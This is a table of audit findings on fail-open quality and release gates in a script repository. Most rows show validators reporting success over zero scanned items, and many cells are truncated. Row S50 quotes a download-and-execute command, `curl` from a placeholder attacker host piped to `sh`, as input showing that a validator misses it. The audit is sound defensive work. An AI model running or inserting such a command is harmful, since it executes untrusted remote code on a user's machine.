| S28 | high | CLOSED (parent-reproduced 2026-08-01) | c | `skills/public/quality/scripts/dup_ratchet_rebaseline.py:63` | `--write-baseline` when `charness-artifacts/quality/dup-ratchet-baseline.json` EXISTS but is truncated/malformed/legacy-shaped. `load_gate_baseline_ids` returns None on unreadable- | Ran it with a truncated baseline, `--baseline-delta-threshold 5`, no `--confirm-baseline-delta`, 50 live families: returns `{ok: true, status: 'baseline-written', code_family_count |
| S29 | high | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/quality/scripts/dup_ratchet_scan.py:232` | A zero-byte / empty scan inventory (exactly what a crashed `nose query`, a truncated redirect, or a nonzero-exit `inventory_doc_duplicates` subprocess produces; run_doc_inventory a | status "clean", ok true, block false, degraded_reasons [], exit 0. families_from_text returns [] (not None) for empty text and doc_drift_signatures returns (set(), None) with NO de |
| S30 | high | CLOSED (parent-reproduced 2026-08-01) | f | `skills/public/quality/scripts/inventory_ci_local_gate_parity.py:114` | A workflow file named `.github/workflows/ci.yaml` (GitHub Actions accepts .yaml) containing `npm run verify` followed by a required `npm run secret-scan` step. Run with --require-e | `1 workflow(s) scanned; 0 parity-issue step(s)`, exit 0. DEFAULT_WORKFLOW_GLOB is `.github/workflows/*.yml`, so every `.yaml` workflow is invisible to the parity gate — the denomin |
| S31 | high | OPEN (narrowed 2026-08-01, NOT closed) | h | `skills/public/quality/scripts/inventory_ci_local_gate_parity.py:160` | Same workflow as above, saved as `.yml`, with `# charness:gate-policy local-gate-subset-mirror` prepended as the first line of the file being judged. | `0 parity-issue step(s)`, exit 0, plus an informational `exempt ...: gate-policy=local-gate-subset-mirror`. A self-declared comment inside the audited workflow exempts that whole w |
| S32 | high | CLOSED (parent-reproduced 2026-08-01) | f | `skills/public/quality/scripts/inventory_ubiquitous_language.py:204` | A `domain_language_contract` whose `surface_globs` has a typo (`doc/**/*.md` instead of `docs/**/*.md`) while a real doc contains a deprecated alias three times. `_iter_files` matc | Ran it: `Ubiquitous-language inventory: ok (1 terms).` exit 0, with no signal that zero files were scanned. The denominator silently narrowed to zero and the verdict is PASS. Same  |
| S33 | high | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/quality/scripts/migrate_dup_fingerprints.py:128` | A live nose scan that returns zero families (scope_paths matching nothing after a rename, or an empty scan with reason falsy). Verified against the pure lib: collision_report([]) → | build_report returns {'ok': True, 'status': 'planned'} and main() exits 0. Under --execute, apply_report then writes an EMPTY gate baseline and an EMPTY nose baseline, silently dro |
| S34 | high | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/quality/scripts/nose_report_lib.py:344` | `extract_report({"schema_version": 4, "clone_families": [{"id": "a"}], "summary": {"families": 7}})` — a future/renamed nose JSON key. | `([], '', {}, {'total_families': 7, ...})` → `run_nose` sets `status = "clean"`. A schema the reader does not understand yields ZERO families and a clean verdict, indistinguishable |
| S35 | high | NARROWED (2026-08-01, not closed) | c | `skills/public/release/scripts/current_release.py:114` | Repo with `packaging/charness.json` at 9.9.9, `plugins/charness/.claude-plugin/plugin.json` at 1.0.0, and NO codex plugin.json / marketplace.json (deleted or unwritten by a failed  | `drift` lists only the claude mismatch; `codex_plugin=None` and `claude_marketplace_version=None` produce NO drift entry — a missing release surface reads identically to a matching |
| S36 | high | LEAD | c | `skills/public/release/scripts/publish_release.py:36` | An installed/vendored release skill copy that does not carry `skill_runtime_bootstrap.py` in any ancestor directory (the drifted foreign copy the function exists to refuse). | `if bootstrap is None: return` — the provenance refusal is skipped and the full bump/sync/quality/tag/publish pipeline runs from the foreign copy. The backstop is suppressed by exa |
| S37 | high | LEAD | c | `skills/public/release/scripts/publish_release_narrative_gate.py:61` | A publish that passes no `--notes-file`, i.e. `create_release` takes the `--generate-notes` branch (publish_release_helpers.py:168). | `run_notes_file_preflight` returns immediately (`if notes_file is None: return`), so the mutable-source-tree-pointer rule never runs before publish; the only remaining check is `au |
| S38 | medium | SUBAGENT-CONFIRMED | d | `scripts/check_artifact_surface_preflight.py:415` | `--changed-artifacts` with no paths, or with paths that map to no commit_boundary surface — e.g. `charness-artifacts/quality/latest.md` (a real artifact with a real validator, but  | Ran both: `artifact-shape-preflight: ok` exit 0 in each case. The commit-boundary arm reports a green verdict when zero validators ran, and the report body lists no rows, so 'ok' o |
| S39 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/check_python_lengths.py:287` | `python3 scripts/check_python_lengths.py --headroom` (or `--headroom --json`) with no `--paths`. Line 287 passes `args.paths or []`, and `[]` is not None, so `select_targets` inter | Ran it: prints nothing at all, exit 0 (`--json` prints `{"headroom": []}`). The advisory whose own `--help` says it prints `limit - current` headroom 'per gated file' silently repo |
| S40 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/check_python_lengths.py:252` | `--paths` carrying only paths outside the gated glob universe — e.g. a pre-commit hook whose staged list is markdown/config, or paths expressed relative to a subdirectory so the `r | Ran `--paths README.md docs/handoff.md`: `Validated Python length limits for 0 file(s).` exit 0. A hard length gate reports a pass having measured nothing, with the count of zero b |
| S41 | medium | SUBAGENT-CONFIRMED | b | `scripts/check_python_runtime_inheritance.py:107` | A `subprocess.run(["/bin/bash","-lc", ...])` call inside a function whose body contains a COMMENT mentioning both strings, e.g. `# TODO: we do not pin sys.executable on the PATH he | Ran it: prints "Validated Python runtime inheritance for bash login-shell subprocess commands." and exits 0 on the exact file whose comment states the pin is absent. Any docstring, |
| S42 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/check_skill_bootstrap_vars.py:158` | mkdir /tmp/t6; python3 scripts/check_skill_bootstrap_vars.py --repo-root /tmp/t6 | 'Validated SKILL.md bootstrap vars for 0 skill file(s).' exit 0. Zero targets is reported as a successful validation. There is no floor asserting the glob resolved anything, so a r |
| S43 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/check_skill_cut_safety.py:225` | python3 scripts/check_skill_cut_safety.py --repo-root . --path skills/public/release/references/critique-boundary.md --json (any explicit --path that is not exactly skills/{public, | {'skills': [], 'status': 'clean'} exit 0. The caller explicitly asked whether a cut to a references contract home was safe and got a green verdict over zero checks. _is_skill_surfa |
| S44 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/check_skill_surface_preflight.py:259` | `--changed-skill-md` invoked with an empty list (a hook whose changed-path computation returned nothing), or with ABSOLUTE paths — `_is_skill_core_path` requires exactly 4 repo-rel | Ran both: `{"blocked": [], "checked": [], "status": "ok"}`, exit 0, including when handed the absolute path of a real SKILL.md. The commit-boundary core-headroom ratchet reports pa |
| S45 | medium | SUBAGENT-CONFIRMED | f | `scripts/check_test_production_ratio.py:125` | A repo root where `python_files(...)` finds no production Python (wrong `--repo-root`, a git-listing narrowing, or every source file living under an IGNORED_DIRS name) while `tests | Ran it: `source_lines=0, test_lines=2 -> ratio 0.0`, exit 0. The true ratio is unbounded (maximum possible bloat) and the gate reports the minimum. An empty denominator yields the  |
| S46 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/check_test_repo_copy_invariants.py:319` | python3 scripts/check_test_repo_copy_invariants.py --repo-root /tmp/t1 (empty dir). find_violations: `if not tests_root.is_dir(): return []`. The CLI default is --repo-root Path.cw | exit 0 with no output. Run from any wrong cwd, or in a layout where tests/ moved, the test-isolation gate certifies PASS over zero files. |
| S47 | medium | SUBAGENT-CONFIRMED | d | `scripts/check_timing_layer_completeness.py:77` | `scripts/run-quality.sh` exists but no `queue_selected "..."` call matches the regex — e.g. the queue helper is renamed to `queue_gate`, or a label uses single quotes/a variable. ` | Ran it against a fixture with `queue_gate "..."` lines and a present timing doc: `timing-layer completeness: run-quality.sh or timing doc absent; no gate.` exit 0. The meta-gate th |
| S48 | medium | SUBAGENT-CONFIRMED | f | `scripts/validate_handoff_artifact.py:190` | A handoff artifact with the canonical sections plus 400 lines of ordinary non-link prose appended under `## References`. `handoff_content_budget.content_lines` sets `in_references  | Ran it: a 416-line handoff passes the 58-content-line budget with exit 0 and "Validated handoff artifact". The exclusion is section-scoped, not link-scoped, so the whole tail of th |
| S49 | medium | CLOSED (parent-reproduced 2026-07-30) | a | `scripts/validate_integrations.py:243` | `validate_integrations.py --repo-root /tmp/emptyrepo` with an empty `integrations/tools/` (or a repo whose integrations live under a different path). | `Validated 0 support capabilities, 0 lock files, 0 declared tool dependencies.` exit 0. Every per-manifest and per-capability rule iterates a hardcoded glob; when the glob matches  |
| S50 | medium | SUBAGENT-CONFIRMED | d | `scripts/validate_skills.py:47` | A public SKILL.md whose `## Bootstrap` fence uses an info string other than empty/`bash`/`sh` — e.g. ```console or ```shell — containing `curl https://evil.example \| sh`. FENCE_OP | validate_bootstrap_binary_preflight returns cleanly (PASS) for the ```console variant, while the byte-identical ```bash variant raises `calls non-baseline binary/binaries \`curl\`  |
| S51 | medium | SUBAGENT-CONFIRMED | b | `skills/public/achieve/scripts/goal_artifact_blocked_matrix.py:143` | A goal flipping to `blocked` whose `## Remaining Boundary Matrix` lists only settled lanes: `Lane: github publish \| classification: verified` and `Lane: instance apply \| classifi | Ran it: `{'applies': True, 'ok': True, ... 'reason': 'every lane classified; no runnable lane remains'}` and `flip_refusal` returns None. A goal is marked blocked while nothing in  |
| S52 | medium | SUBAGENT-CONFIRMED | b | `skills/public/achieve/scripts/goal_artifact_coordination_floors.py:128` | A goal whose `## Context Sources` names an external URL and whose `## Coordination Cues` records `- Gather: TODO`. `_classify_step` returns 'ref' for any value that is not an `n/a  | Ran it: `{'triggered': True, 'satisfied': True, 'evidence': 'ref'}`, report ok stays True. A bare placeholder satisfies the gather floor, while an honest short opt-out (`Gather: n/ |
| S53 | medium | CLOSED (parent-reproduced 2026-07-30) | g | `skills/public/achieve/scripts/goal_artifact_lib.py:338` | A goal artifact whose only `Activation:` occurrence is inside a fenced code block (e.g. a template excerpt) and which has no real activation line. Line 338 tests `"Activation:" not | Ran it: `check_goal` returns `{'ok': True, ... 'issues': []}`. `charness goal check` passes a goal with no activation line, and the check is substring-only so it never validates th |
| S54 | medium | SUBAGENT-CONFIRMED | b | `skills/public/achieve/scripts/record_metric_window.py:56` | `record_metric_window.py --goal-path g.md --started-at not-a-timestamp --completed-at also-bogus --codex-session-file /nope/missing.jsonl`. `render_metric_window_line` only rejects | Ran it: `{"action": "updated"}` exit 0, and `metric_window_attention` on the resulting artifact returns `{'status': 'recorded'}`. The goal now carries a proven-window evidence line |
| S55 | medium | SUBAGENT-CONFIRMED | a | `skills/public/create-skill/scripts/resolve_adapter.py:146` | No adapter file at any of the five ADAPTER_CANDIDATES paths. `load_adapter` returns `{"found": False, "valid": True, ...}` — 'valid' is asserted for a file that does not exist. The | Ran plan_debug_run.py in /tmp/dbg1 (no .agents/ at all): gate packet `adapter-readiness` reports `status: pass` with `path: None`, and the envelope's `ok` is True. A readiness gate |
| S56 | medium | CLOSED (parent-reproduced 2026-07-30) | c | `skills/public/debug/scripts/plan_debug_run.py:84` | A debug artifact whose Risk Class line pairs a forced class with any unrecognized token: `- Risk Class: external-seam, bogus`. `risk_interrupt_lib._parse_risk_classes` raises Valid | Ran it: requires_interrupt False, mode `continue-existing-artifact`, ok True (risk_parse_error is recorded in the payload but nothing keys on it). A declared `external-seam` never  |
| S57 | medium | SUBAGENT-CONFIRMED | b | `skills/public/gather/scripts/gather_plan.py:193` | `--url ""` or `--url "not a url at all"` against any repo root, including one with no gather adapter at all (`load_adapter` infers defaults and returns `valid: True, path: None`).  | Ran both: `ok: true`, exit 0, `adapter-readiness: pass`, `next_action.kind = fetch_public_url` with the garbage string passed straight through as `--url`, and `source.host` set to  |
| S58 | medium | SUBAGENT-CONFIRMED | a | `skills/public/handoff/scripts/chunked_routing_agentic_validation.py:193` | A chunk proposal merging 3 sources with `basis_boundary_tokens: []` (or the key omitted, which defaults to `[]` at line 184). The broad-merge check is guarded by `basis_tokens and  | Ran it with default policy: `{'basis_boundary_tokens': ['label/bug']}` -> issue "merge justified only by broad boundary tokens"; `[]` and the missing key -> `ok=True, issues=[]`. A |
| S59 | medium | SUBAGENT-CONFIRMED | a | `skills/public/handoff/scripts/parse_handoff_entries.py:126` | A handoff whose '## Next Session' section is present but empty (or absent entirely) — chunked_routing_parser.extract_next_session_block returns '' and parse_handoff_entries returns | {'ok': true, 'entry_count': 0, 'entries': [], 'staleness': {...all zeros...}} exit 0. The chunked-routing pipeline's source stage certifies success over an empty backlog; downstrea |
| S60 | medium | SUBAGENT-CONFIRMED | b | `skills/public/handoff/scripts/plan_handoff_run.py:176` | A pickup invocation whose prose contains any whitespace token with a `/` in it that is not the word 'handoff' — e.g. `resume the retro/quality work`, `continue the A/B test`. `_inv | Ran both against the live repo (7 parseable Next Session entries): with `resume work` the required_reads include `references/continuation-sequence.md`; with `resume the retro/quali |
| S61 | medium | SUBAGENT-CONFIRMED | b | `skills/public/issue/scripts/issue_backend.py:150` | probe_backend({'id':'acme','binary':'false'}) then backend_ok(selected) / build_preflight_payload({'backend':{'id':'acme','binary':'false'},'adapter_ok':True,'adapter':{}}) | version probe returns {'exit_code': 1, ...} yet backend_ok → True and preflight ok → True. For any non-gh backend the verdict is keyed only on `selected['found']` (binary present o |
| S62 | medium | SUBAGENT-CONFIRMED | f | `skills/public/quality/scripts/check_standing_doc_provenance.py:84` | `standing_doc_provenance.standing_docs: ["doc/rule.md"]` (typo, or a path that git does not see) while docs/rule.md carries a stacked ISO date plus two issue refs. `_resolve_paths` | Ran it: `OK: 0 standing doc(s) scanned; no drifted provenance.` exit 0. `inert: False` means the caller reads it as 'opted in and clean', which is precisely the distinction the lib |
| S63 | medium | SUBAGENT-CONFIRMED | h | `skills/public/quality/scripts/ci_local_gate_parity_lib.py:221` | Any workflow with a top-of-file comment `# charness:gate-policy scheduled-deeper-check`, `on: [push]`, and a step `run: echo CI-only extra gate`. | {'gate_policy': 'scheduled-deeper-check', 'exempt': True, 'jobs': [], 'jobs_without_canonical_gate': []}. A self-declared one-line comment exempts an entire workflow from parity en |
| S64 | medium | SUBAGENT-CONFIRMED | b | `skills/public/quality/scripts/inventory_cli_ergonomics.py:106` | cli_ergonomics_lib.scope_status(3, False) → {'status': 'clean', 'scope_classification': 'scanned'}. `status` is computed from the NUMBER OF SCANNED FILES only; `findings` is never  | payload['status'] == 'clean' even when findings is non-empty, and main() returns 0 unconditionally. A consumer keying on status (or exit code) reads 'clean' for a repo full of CLI- |
| S65 | medium | SUBAGENT-CONFIRMED | d | `skills/public/quality/scripts/inventory_gitignore_scan_hygiene.py:126` | A scanner file matching the path globs that fails to parse (`except SyntaxError: return []`), while containing a non-git-aware `repo_root.rglob(...)`. | Ran both variants of the same file: with a trailing syntax error `--require-empty` exits 0 and prints nothing; with the syntax fixed it exits 1 and reports the finding. The AST che |
| S66 | medium | SUBAGENT-CONFIRMED | a | `skills/public/quality/scripts/measure_startup_probes.py:161` | `measure_startup_probes.py --repo-root /tmp/sp` on a repo with no adapter / no `startup_probes` key. | `No startup probes matched the selected class.`, exit 0. Zero probes measured is the same PASS as all probes green; a dropped or misspelled `startup_probes` block silently converts |
| S67 | medium | SUBAGENT-CONFIRMED | b | `skills/public/quality/scripts/propose_mutation_testing.py:196` | `propose_mutation_testing.py --repo-root <repo> --execute` on a repo with a valid adapter and no mutation_testing block. Line 194-196 sets `status = "installed"` unconditionally af | Ran it: `"status": "installed", "recommendation": "mutation_testing is configured; no action."` — then an immediate read-only re-run of the same script on the same repo prints `"st |
| S68 | medium | SUBAGENT-CONFIRMED | a | `skills/public/quality/scripts/render_runtime_summary.py:92` | `render_markdown_lines({"runtime_profile": "p"}, signals_present=False)` — a report with no runtime data at all (missing/renamed `runtime_visibility_findings` key, or an evaluate() | Emits `- runtime visibility: configured.` in the same block as `- runtime source: not configured`. `_format_visibility` asserts the positive verdict from an EMPTY findings list, so |
| S69 | medium | SUBAGENT-CONFIRMED | b | `skills/public/quality/scripts/render_runtime_summary.py:119` | A repo whose runtime samples come from the `command_timing_log` adapter key: renderer emits `- runtime source: repo-declared command-timing log \`logs/t.jsonl\` ingested via the \` | scripts/validate_quality_artifact.py's validate_runtime_signals_section REJECTS it: 'must cite structured runtime metrics or state that timing capture is missing'. The renderer's o |
| S70 | medium | SUBAGENT-CONFIRMED | a | `skills/public/quality/scripts/scaffold_quality_artifact.py:24` | The scaffold's own unmodified output — every slot still literally `TODO` (`TODO answer structural_review_packet`, `- [TODO prior review](history/TODO-quality-review.md)`, `Delegate | Ran it: `Validated quality artifact charness-artifacts/quality/latest.md.` exit 0. The comment at line 22-24 states this pass-by-construction as the design, but it means the qualit |
| S71 | medium | SUBAGENT-CONFIRMED | f | `skills/public/quality/scripts/test_discovery_lib.py:151` | A repo with no adapter `test_file_discovery.command` whose tests do not match the built-in globs or the adapter patterns (e.g. Ruby `*_spec.rb`, or a patterns typo). The pattern pa | Ran it against /tmp/td containing one non-matching test file: `([], {'source': 'default', 'command_status': None, 'degraded': False, 'error': None})`. A zero test surface is report |
| S72 | medium | SUBAGENT-CONFIRMED | a | `skills/public/quality/scripts/validate_boundary_bypass_payload.py:112` | echo '{"schemaVersion":"charness.quality.boundary_bypass_inventory.v1","status":"ratchet","summary":{"scanned_test_files":0,"candidate_count":0,"candidate_key_count":0,"convertible | {'ok': true, ...} exit 0. Every derived cross-check is 0 == 0. `scanned_test_files` is the only field that could distinguish 'inventory ran and found nothing' from 'inventory never |
| S73 | medium | SUBAGENT-CONFIRMED | d | `skills/public/release/scripts/check_requested_review_gate.py:94` | python3 skills/public/release/scripts/check_requested_review_gate.py --repo-root . --artifact /tmp/does-not-exist.md --skip-commands --json | {'status': 'ok', 'artifact_exists': false, 'unavailable_hits': [], 'waiver_hits': [], 'command_results': [], 'warnings': []} exit 0. The artifact scan never ran (no file) and no re |
| S74 | medium | SUBAGENT-CONFIRMED | d | `skills/public/release/scripts/current_release.py:80` | `current_release.py --repo-root /tmp/cr` where the path is not a git work tree (or git is unavailable / the repo is locked). | `git_status: []`. `_git_status` returns `[]` on any non-zero returncode, so a git failure is indistinguishable from a clean worktree in the release-readiness payload — the check si |
| S75 | medium | SUBAGENT-CONFIRMED | a | `skills/public/retro/scripts/plan_retro_run.py:120` | `plan_retro_run.py --changed-paths` with zero values (nargs="*" yields `[]`, which is not None, so `_work_paths` returns the override and never falls back to the working tree or re | Ran it against the charness repo itself (a system-improving repo): `work_class unknown`, `lens_brief` = the generic 'Default Pattern' catalog blurb, ok True. The mandatory Engelbar |
| S76 | medium | LEAD | b | `scripts/check_coverage_lib.py:121` | `tests/quality_gates/test_check_coverage_inventory.py:140` calls `exercise_control_plane_scenarios()`, a ~100-line function that invokes ~60 control-plane/provenance/support-sync/l | The per-file coverage floor (PER_FILE_MIN_COVERAGE, enforced for scripts/control_plane_lib.py et al. per run-quality.sh:163) is satisfied by execution alone. Any of those functions |
| S77 | medium | LEAD | d | `scripts/check_doc_authoring_preflight.py:159` | Neither markdownlint-cli2 nor npm on PATH → collect_markdownlint returns {'available': False, 'findings': []}. Report.blocked (line 278) reads markdownlint['findings'] only. | to_dict()['status'] == 'ok' and main() returns 0 for a doc with markdownlint violations, because the rule class was never forecast. A warning is appended, but the machine-readable  |
| S78 | medium | LEAD | f | `scripts/check_js_mutation_score.py:69` | A StrykerJS report where most mutants carry statuses outside {Killed, Survived, NoCoverage, Timeout, Ignored} — e.g. CompileError or RuntimeError, which fall into the "Other" bucke | reachable = killed + survived silently narrows the denominator to only the two counted buckets, so a run where 900 of 1000 mutants errored out and 60 of the remaining 100 were kill |
| S79 | medium | LEAD | e | `scripts/check_skill_cut_safety.py:241` | Passing --path for a SKILL.md the change DELETED. contract_pin_breaks (line 122) returns [] when `not skill_md.is_file()`, reference_home_gaps (line 148) returns [] likewise, and t | status 'clean', exit 0 for a maximal cut. The unconditional deleted-surface REVIEW backstop — added precisely so 'a maximal cut must never fall through to zero findings' — lives on |
| S80 | medium | LEAD | a | `scripts/check_skill_ownership_overlap.py:57` | --repo-root pointing anywhere without skills/public (default is Path('.'), so any wrong cwd): `if not public_root.is_dir(): return {'findings': [], 'scanned_skills': 0}` | 'check_skill_ownership_overlap: ok (0 skills, allowlist=0)' exit 0. Additionally the file walk at line 71 uses sub_dir.iterdir(), not rglob, so any .py/.md nested one level deeper  |
| S81 | medium | LEAD | a | `scripts/validate_ideation_artifact.py:76` | An ideation artifact with no `## Structured Questions` heading, or whose questions use `* ` bullets instead of `- `. | `validate_structured_questions` returns immediately on an empty bullet list, and it is the ONLY rule `validate_ideation_artifact` runs. The artifact is reported validated while zer |
| S82 | medium | LEAD | c | `scripts/validate_inference_interpretation.py:243` | A registry whose `leak_scan.exclude_prefixes` is broadened (e.g. adding `"scripts/"` or `"s"`), which the loader accepts as long as entries are non-empty strings. | `scan_repo_declarations` skips those files, so the LEAK check — the half that catches a verified fact carrying a distrust declaration, called 'the contract's cardinal error' — sile |
| S83 | medium | LEAD | d | `skills/public/achieve/scripts/goal_artifact_head_freshness.py:86` | `check_head_freshness(text, head_sha=None)` — `current_head` returned None because `git rev-parse HEAD` failed (no repo, unborn branch, OSError). | `{"ok": True, "skip_reason": "git HEAD unavailable", "findings": []}`. The ok-shaped verdict is True for a check that did not run; a caller keying on `ok` treats every stale HEAD s |
| S84 | medium | LEAD | h | `skills/public/achieve/scripts/goal_artifact_timebox.py:222` | A timeboxed goal whose self-declared `Done-early policy:` line does not contain the substring `continue_next_improvement` (e.g. `Done-early policy: close_when_done`), or which simp | `check_timebox_closeout` returns status `non_continuing_policy` (or `not_timeboxed`) with ok True, and never reaches `_early_close_readiness` — so the entire early-close ledger flo |
| S85 | medium | LEAD | f | `skills/public/handoff/scripts/chunked_routing_issue_source.py:266` | A repo with more open issues than `config["limit"]` (DEFAULT_ISSUE_LIMIT = 50). `list_open_issues` passes `--limit` to the provider and returns the page verbatim; nothing compares  | `LAST_OPEN_ISSUE_NUMBERS` and the returned entries cover only the newest 50 open issues, and `parse_handoff_entries` emits `issue_entry_count` with no `truncated` flag. The chunked |
| S86 | medium | LEAD | c | `skills/public/issue/scripts/issue_tool.py:143` | Running `close-with-comment` from a copy of the skill that has no skill_runtime_bootstrap.py in any ancestor directory (a partially-vendored or hand-copied export). _refuse_foreign | The drifted-foreign-copy refusal — the guard the docstring justifies as protecting an irreversible close — silently no-ops, and the close proceeds. The backstop is suppressed by ex |
| S87 | medium | LEAD | c | `skills/public/quality/scripts/check_dup_ratchet.py:138` | A gate baseline file that is present and loadable but carries an EMPTY family_id list, combined with a real (non-injected) code scan that returns zero families because nose is brok | The 'code scan returned 0 families but the gate baseline has N; likely a broken scan or misconfigured scope_paths' degrade never fires, `evaluate` is handed an empty live set again |
| S88 | medium | LEAD | c | `skills/public/quality/scripts/inventory_doc_duplicates.py:181` | A nose binary whose `--version` output cannot be parsed by parse_nose_version (nose_version returns None). The guard is `if version is not None and version < MIN_NOSE_VERSION`. | The MIN_NOSE_VERSION floor is skipped entirely; run_query then gets a payload with no `markdown` key, families becomes [], and the payload is status "ok" with family_count 0 and ex |
| S89 | medium | LEAD | a | `skills/public/quality/scripts/validate_skill_ergonomics.py:235` | A repo whose quality adapter has no `skill_ergonomics_gate_rules` (or an empty list). | `violations: []`, `has_failures` False, exit 0, with only a WARNING string in the human output. Every ergonomics heuristic is disabled by a missing config key while the exit code i |
| S90 | medium | LEAD | c | `skills/public/release/scripts/publish_release_helpers.py:394` | `commit_post_publish_artifact` when the release verification artifact has already been `git add`ed (staged) by an earlier step. | `git diff --quiet -- <paths>` compares worktree vs INDEX, so staged content returns 0 → early `return`. The post-publish verification artifact is never committed or pushed, `payloa |
| S91 | medium | LEAD | f | `skills/public/release/scripts/publish_release_helpers.py:244` | A repo with no prior `v*.*.*` tags (first release, shallow clone, or tags not fetched): `latest_previous_release_version` returns None, so `release_previous_version` falls back to  | `_release_base_ref` finds neither local nor remote tag and silently returns `{remote}/{branch}` as the base — the diff is computed against the branch tip, so `unreleased_paths` col |
| S92 | medium | LEAD | b | `skills/public/release/scripts/publish_release_resume.py:299` | Resume in the `release-content` phase where the TAG reached the remote but the BRANCH did not (a push that transferred the tag ref then failed, or a rejected non-fast-forward branc | `git push <remote> <branch> <tag>` is never run, so the release commit never lands on the remote branch, yet `create_release` + `verify_release_visible` succeed against the pushed  |
| S93 | medium | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/release/scripts/publish_release_same_proxy_guard.py:129` | A configured post_publish_distinct_channel_probe that unwraps to zero tokens — e.g. `env`, or `sh -c ""` — reaching `if not probe_tokens: return False`. | Returns False (= not same-proxy) despite the docstring's stated contract that 'every branch that cannot ESTABLISH distinctness returns True'. The caller (publish_release_post_creat |
| S94 | low | SUBAGENT-CONFIRMED | a | `scripts/check_doc_links.py:421` | python3 scripts/check_doc_links.py --repo-root /tmp/emptyrepo (no docs matching DOC_GLOBS). | `Validated markdown links.` exit 0 — a claim that links were validated when iter_docs returned nothing. load_canonical_markdown_surfaces also silently yields an empty allowlist whe |
| S95 | low | SUBAGENT-CONFIRMED | a | `scripts/check_python_runtime_inheritance.py:124` | `--repo-root` pointing at a tree where none of DEFAULT_SCAN_GLOBS match (a consuming repo without `scripts/*.py` or `skills/*/scripts/*.py`, or a mistyped root). | Ran against an empty dir: prints "Validated Python runtime inheritance for bash login-shell subprocess commands." and exits 0. Zero files scanned is reported identically to zero vi |
| S96 | low | SUBAGENT-CONFIRMED | a | `scripts/validate_profiles.py:236` | `validate_profiles.py --repo-root /tmp/np` — no `profiles/*.json`. | `No profile instances found.` exit 0. Also PROFILE_SCHEMA_PATH is bound to the SCRIPT's repo root, not `--repo-root`, so a foreign repo's profiles are validated against this repo's |
| S97 | low | SUBAGENT-CONFIRMED | a | `skills/public/handoff/scripts/chunked_routing_lib.py:195` | `validate_ranker_response({"ranked_chunks": []}, MergeProposal(standalone=(), merged=(), shared_boundary_reason={}))` — an empty merge proposal (a chunker run that produced no cand | `{"ok": True, "issues": []}`. A ranking round-trip over zero candidates reports a valid ranker response; the 1..N contiguity backstop at line 188 is additionally suppressed wheneve |
| S98 | low | SUBAGENT-CONFIRMED | a | `skills/public/quality/scripts/check_runtime_budget.py:37` | A repo whose quality adapter declares no `runtime_budgets` for the selected profile. `summarize` computes `status` solely as 'violations' if violations else 'ok'. | Ran `--summary` on a fixture with no budgets: `budgets_configured: 0`, `checked_status_counts: {ok: 0, other: 0}`, `status: ok`, exit 0. The human renderer says 'No runtime_budgets |
| S99 | low | LEAD | e | `scripts/check_skill_contracts.py:332` | FORBIDDEN_SNIPPETS is validated with _read_contract_text (SKILL.md body only) while PACKAGE_CONTRACTS is validated with _package_text (SKILL.md + every references/*.md + PACKAGE_CO | A forbidden phrase (e.g. 'local critique' in skills/public/release) moved out of SKILL.md into references/critique-boundary.md passes the forbidden check, even though that same ref |
| S100 | low | LEAD | a | `scripts/check_spec_evidence_durability.py:194` | `--repo-root` pointing at a tarball install / worktree without `.git` (or DOC_GLOBS matching nothing, e.g. artifacts under charness-artifacts/goals\|retro\|ideation which are not i | `Skipping evidence-durability check: no git work tree`, exit 0; or `Validated spec evidence durability across 0 doc(s).` Both are the same success exit as a real pass, and the glob |
| S101 | low | LEAD | a | `scripts/validate_cautilus_call_provenance.py:86` | A repo where `.cautilus/runs/` is absent or empty (it is a gitignored runtime dir, so this is the default state on any fresh checkout or CI runner). | `No .cautilus/runs/ directory; nothing to check.` exit 0. The post-hoc provenance backstop for direct `cautilus evaluate` calls cannot fire in the environment where the gate usuall |
| S102 | low | LEAD | h | `scripts/validate_quality_artifact.py:237` | A quality artifact reviewing standing-test/runtime cost whose prose never contains the literal tokens 'slow', 'standing test', or 'fixture economics'. | `slow_gate_scope` is False, so the SLOW_GATE_DELEGATED_LENSES requirement (fixture-economics, parallel-critical-path, duplicated-proof) never runs and an 'executed' delegated revie |
| S103 | low | LEAD | c | `skills/public/handoff/scripts/chunked_routing_agentic_policy.py:95` | A handoff adapter that configures a stricter `chunk_policy` (smaller max_package_sources, extra broad_boundary_tokens) but whose YAML fails to load, or a config setting `broad_boun | The bare `except Exception: return config` silently substitutes DEFAULT policy, and `isinstance(values, list)` accepts an empty list, so the broad-boundary-token guard can be disab |
| S104 | low | LEAD | b | `skills/public/issue/scripts/issue_read.py:55` | Any successful read, including an issue with zero comments or a backend whose adapter-overridden `view` template omits the comments flag while still satisfying the `{json_fields}`  | `comments_read: True` is a constant in the returned payload — it is set unconditionally whenever the parsed payload contains a list. A downstream consumer reading `comments_read` t |
| S105 | low | LEAD | b | `skills/public/issue/scripts/issue_runtime.py:75` | `resolve_target` with no `--repo` argument, no parseable git remote (detached copy, no remote configured, or a remote URL form outside REMOTE_PATTERNS), and no adapter `default_rep | It fabricates `owner = default_org, repo = repo_root.name` and reports source `cwd-default-org` rather than failing. Subsequent issue reads/closes target a repository name invented |
| S106 | low | LEAD | d | `skills/public/narrative/scripts/map_sources.py:73` | _status_lines returns [] when `git status --short` exits non-zero (not a repo, index lock, bad path). _git_freshness by contrast labels its failures ('not-git', 'missing-remote', ' | payload['dirty_paths'] == [] — indistinguishable from 'every source document is clean'. The freshness block was deliberately built to keep not-run distinguishable; its sibling in t |
| S107 | low | LEAD | c | `skills/public/quality/scripts/inventory_brittle_source_guards.py:92` | A source guard whose quoted pattern is shorter than --min-pattern-chars (default 40) and which is NOT present in its target file at all. | `_finding_for_guard` returns early with the pre-seeded `status: "ok", exact_found: False, normalized_found: False` before ever opening the target. A completely broken guard (missin |
| S108 | low | LEAD | c | `skills/public/release/scripts/publish_release_cli.py:178` | A release adapter whose `product_surfaces` key is absent, misspelled, or missing either `installable_cli` or `bundled_skill`. `run_cli_skill_surface_gate` is a plain `if` with no e | `check_cli_skill_surface.py --run-probes` never runs and the publish proceeds with no signal that the CLI/skill surface gate was skipped; the release payload carries no field disti |
